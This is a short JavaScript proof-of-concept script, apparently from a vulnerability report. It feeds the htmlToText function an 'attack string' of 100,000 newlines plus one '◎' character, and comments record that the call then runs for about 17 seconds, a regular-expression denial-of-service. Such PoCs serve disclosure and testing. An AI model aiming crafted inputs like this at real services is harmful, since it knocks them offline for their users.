const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"\n"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "\n";
}
str += "◎";

var result = htmlToText(str, "");

// real    0m16.818s
// user    0m16.792s
// sys     0m0.010s
